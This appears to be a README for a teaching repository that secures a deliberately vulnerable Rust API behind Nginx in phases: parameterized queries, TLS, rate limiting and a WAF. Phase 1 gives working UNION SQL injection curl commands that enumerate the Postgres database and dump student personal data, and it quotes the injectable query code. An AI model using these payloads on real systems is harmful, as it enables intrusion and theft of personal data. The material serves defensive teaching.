# Securing Nginx: A Step-by-Step Guide

This project demonstrates a progressive approach to securing a web application 
using Nginx as a reverse proxy. It's structured in five phases, each building 
upon the previous one to showcase different security measures and best practices.

## Disclaimer ⚠️

**This project is for educational purposes only.  Source code and configuration in this repository demonstrate intentionally insecure practices to highlight the importance of proper security measures.** 

The vulnerabilities shown in this project are dangerous and can lead to catastrophic security breaches if used in a real-world application. By proceeding with this project, you acknowledge that you understand the risks associated with these vulnerable practices and agree to use this knowledge responsibly and ethically.

Always sanitize your inputs and use parameterized queries to prevent SQL injection vulnerabilities. Always encrypt traffic between services. Never trust user input. 

Security is an ongoing practice, not a one-time implementation. Stay informed and continuously improve your security posture. See the OWASP Top 10 awareness document as a first step. [https://owasp.org/www-project-top-ten/]

## Project Overview

This repo demonstrates an insecure simple web application with a Rust API backend, PostgreSQL database, and Nginx reverse proxy. 

Through five phases, we gradually secure this setup, addressing common vulnerabilities and 
implementing industry-standard security practices.

This is not meant to be an all-encompassing security hardening exercise; it's meant to demonstrate
an approach to implementing basic security measures, including TLS, mitigating excessive load, preventing SQL injection, and setting up a WAF with Nginx.

## Project Structure

The project is organized into five directories; after the first phase, each 
subsequent step represents improvements to overall web application security:

```
.
├── 01-vulnerable-setup
├── 02-parameterized-query
├── 03-adding-tls
├── 04-adding-waf
└── 05-rate-limiting-and-load-shedding
```

Each directory contains the following files and subdirectories:
- `api/`: Rust API source code
- `docker-compose.yml`: Docker Compose configuration for the phase
- `init.sql`: Initial database setup script
- `nginx/`: Nginx configuration files

## Running the stack at any given phase

1. In any given Phase directory, stop containers and start containers:
   ```
   cd 01-vulnerable-setup
   docker-compose up --build
   ```

3. Access the application at `http://localhost` (or `https://localhost` for phases 3-5)

4. Once any given Phase is complete, stop the application:
   ```
   docker-compose down -v
   ```

## Phase 1: Trivially Vulnerable API 

**This phase sets up the basic application with a improperly-written, vulnerable API.** It includes:

- A Rust web API with a trivial SQL injection vulnerability
- A PostgreSQL database
- A basic Nginx reverse proxy configuration

This setup demonstrates common security flaws in web applications, including a SQL injection vulnerability, unencrypted communication due to the absence of TLS, and the lack of measures to mitigate heavy load.

To demonstrate, run the containers in this directory with

```sh
docker compose down -v && \
docker compose build && \
docker compose up
```

When the containers are ready, you can query the API on `localhost` using a browser or other client.

(`http://localhost/search?prefix=Intro`):

```json
[
    {
        "id": 1,
        "title": "Introduction to Philosophy",
        "description": "Explore fundamental questions about existence, knowledge, and ethics.",
        "instructor": "Dr. Anne Johnson"
    },
    {
        "id": 4,
        "title": "Introduction to Psychology",
        "description": "Learn the basics of human behavior, cognition, and emotion.",
        "instructor": "Dr. Rachel Green"
    }
]
```

However, the API currently exposes a SQL injection vulnerability.

A malicious actor can exploit the injection vulnerabilty. They might begin by constructing a query to return metadata about the database, after exploring the output of the API and discovering that it is very poorly designed.  After some exploration, they graft a PostgreSQL `VERSION()` call using a union in order to conform to the inferred shape of the table the application is querying: 
(`http://localhost/search?prefix=Intro' UNION SELECT 1, VERSION(), NULL, NULL--`):

```sh
$ curl http://localhost/search\?prefix\=Intro%27%20UNION%20SELECT%201,%20VERSION\(\),%20NULL,%20NULL-- | jq
[
  {
    "id": 1,
    "title": "PostgreSQL 13.16 on aarch64-unknown-linux-musl, compiled by gcc (Alpine 13.2.1_git20240309) 13.2.1 20240309, 64-bit",
    "description": null,
    "instructor": null
  }
]
```

Discovering that the database appears to be Postgres, the malicious actor can then write a query to list databases... 
(`http://localhost/search?prefix=Intro' UNION SELECT 1, datname, NULL, NULL FROM pg_database--`):

```sh
$ curl http://localhost/search\?prefix\=Intro%27%20UNION%20SELECT%201,%20datname,%20NULL,%20NULL%20FROM%20pg_database-- | jq
[
  {
    "id": 1,
    "title": "template0",
    "description": null,
    "instructor": null
  },
  {
    "id": 1,
    "title": "postgres",
    "description": null,
    "instructor": null
  },
  {
    "id": 1,
    "title": "template1",
    "description": null,
    "instructor": null
  },
  {
    "id": 1,
    "title": "coursedb",
    "description": null,
    "instructor": null
  }
]
```

...tables...

(`http://localhost/search?prefix=Intro' UNION SELECT 1, table_name, NULL, NULL FROM information_schema.tables WHERE table_schema='public'--`):

```sh
$ curl http://localhost/search\?prefix\=Intro%27%20UNION%20SELECT%201,%20table_name,%20NULL,%20NULL%20FROM%20information_schema.tables%20WHERE%20table_schema%20\=%20%27public%27-- | jq
[
  {
    "id": 1,
    "title": "students",
    "description": null,
    "instructor": null
  },
  {
    "id": 1,
    "title": "course_students",
    "description": null,
    "instructor": null
  },
  {
    "id": 1,
    "title": "courses",
    "description": null,
    "instructor": null
  }
]
```
...and columns within tables visible to the application user:

(`http://localhost/search?prefix=Intro' UNION SELECT 1, column_name, data_type, NULL FROM information_schema.columns WHERE table_name='students'--`):


```sh
$ curl http://localhost/search\?prefix\=Intro%27%20UNION%20SELECT%201,%20column_name,%20data_type,%20NULL%20FROM%20information_schema.columns%20WHERE%20table_name%20\=%20%27students%27-- | jq
[
  {
    "id": 1,
    "title": "first_name",
    "description": "character varying",
    "instructor": null
  },
  {
    "id": 1,
    "title": "date_of_birth",
    "description": "date",
    "instructor": null
  },
  {
    "id": 1,
    "title": "email",
    "description": "character varying",
    "instructor": null
  },
  {
    "id": 1,
    "title": "last_name",
    "description": "character varying",
    "instructor": null
  },
  {
    "id": 1,
    "title": "id",
    "description": "integer",
    "instructor": null
  }
]
```

...and, ultimately, all student details:

(`http://localhost/search?prefix=Intro' UNION SELECT id, CONCAT(first_name, last_name), email, CAST(date_of_birth as VARCHAR) FROM students--`):

```sh
$ curl http://localhost/search\?prefix\=Intro%27%20UNION%20SELECT%20id,%20CONCAT\(first_name,%20%27%20%27,%20last_name\),%20email,%20CAST\(date_of_birth%20AS%20VARCHAR\)%20FROM%20students-- | jq
[
  {
    "id": 2,
    "title": "Liam Baker",
    "description": "liam.baker@example.com",
    "instructor": "2002-08-22"
  },
  {
    "id": 1,
    "title": "Sophia Adams",
    "description": "sophia.adams@example.com",
    "instructor": "2001-05-15"
  },
  {
    "id": 5,
    "title": "Emma Evans",
    "description": "emma.evans@example.com",
    "instructor": "2001-07-18"
  },
  ...
]
```

**Securing this API properly will require implementing security measures at multiple layers - in the next step, we'll focus on an immediate patch to the application layer.**

## Phase 2: Implementing parameterized SQL queries

This phase focuses on basic application-level security.  We'll address the immediate concern of the SQL injection vulnerability in the Rust API by parameterizing the query invoked by this API endpoint.

### The vulnerability

In Phase 1, the Rust code exposed a critical SQL injection vulnerability through unsafe string concatenation:

```rust
let sql = format!(
    "SELECT id, title, description, instructor FROM courses WHERE title LIKE '{}%'",
    query.prefix
);
let courses = sqlx::query_as::<_, Course>(&sql)
    .fetch_all(db_pool.get_ref())
    .await;
```

The user-supplied query.prefix is directly inserted into the SQL query string. There's no filtering or escaping of special characters in the user input. As demonstrated in Phase 1, an attacker could inject additional SQL commands, potentially leading to unauthorized data access or manipulation.

### The patch

In Phase 2, the code is improved by using parameterized queries via the `sqlx::query_as!` macro:

```rust
let courses = sqlx::query_as!(
    Course,
    "SELECT id, title, description, instructor FROM courses WHERE title LIKE $1",
    format!("{}%", query.prefix)
)
.fetch_all(db_pool.get_ref())
.await;
```

Now, the SQL query uses a parameter placholder `$1` instead of interpolating the user input directly into the string.  The macro ensures that user input is escaped and treated as data, rather than as part of the SQL command.  If malicious input is provided as an input, it will be treated as literal string data, preventing unintended SQL execution. 

By implementing this patch, the application significantly enhances its security posture against one of the most common and dangerous web application vulnerabilities.

## Phase 3: Adding TLS with Nginx 

This phase introduces HTTPS:
- Adds SSL/TLS encryption using self-signed certificates
- Configures Nginx to use HTTPS and redirect HTTP traffic to HTTPS

This phase demonstrates the importance of encrypted communications in web security.

## Phase 4: Rate Limiting, Load Shedding

Building on the previous phase, this directory adds:
- Rate limiting to prevent abuse of the API
- Load shedding to maintain service availability under high load

These measures help protect against basic denial-of-service attacks 
and API abuse.

To demonstrate, run the containers in this directory with

```sh
docker compose down -v && \
docker compose build && \
docker compose up
```

You can test this by opening a browser to `http://localhost/search?prefix=Intro`.

Refresh the page and notice that it will hang when you make more than one request per second.

Make many consecutive requests by reloading rapidly, and notice that nginx will server a 503 Service Unavailable for a brief period of time.

To observe concurrent connection limits, you can use a tool like `ab`:

```sh
$ ab -n 20 -c 20 http://localhost/search\?prefix\=Intro
```

### How does this work?

We have updated `nginx.conf` to include new directives for rate limiting 
and connection limiting to help manage traffic and protect the server from 
potential abuse.

**`limit_req_zone` and `limit_conn_zone`**:

These directives define the zones for rate limiting and connection limiting:

```nginx
limit_req_zone $binary_remote_addr zone=one:10m rate=1r/s;
limit_conn_zone $binary_remote_addr zone=addr:10m;
```

`limit_req_zone`: Creates a shared memory zone named `one` of 10 megabytes to store 
request rates. It allows each client IP ($binary_remote_addr) to make up to 1 request 
per second (rate=1r/s).

`limit_conn_zone`: Creates a shared memory zone named `addr` of 10 megabytes to track the 
number of simultaneous connections for each client IP.

***`limit_req and limit_conn:`**

These directives apply the rate and connection limits defined above:

```nginx
limit_req zone=one burst=5;
limit_conn addr 10;
```

`limit_req`: Enforces the rate limit from the `one` zone, allowing a burst of up to 5 extra requests.
`limit_conn`: Limits each client IP to a maximum of 10 simultaneous connections in the `addr` zone.

## Phase 5: Adding a WAF

This phase incorporates a Web Application Firewall (WAF):
- Integrates ModSecurity with Nginx
- Configures basic ModSecurity rules to protect against common web attacks

This shows how a WAF can provide an additional layer of security 
for web applications.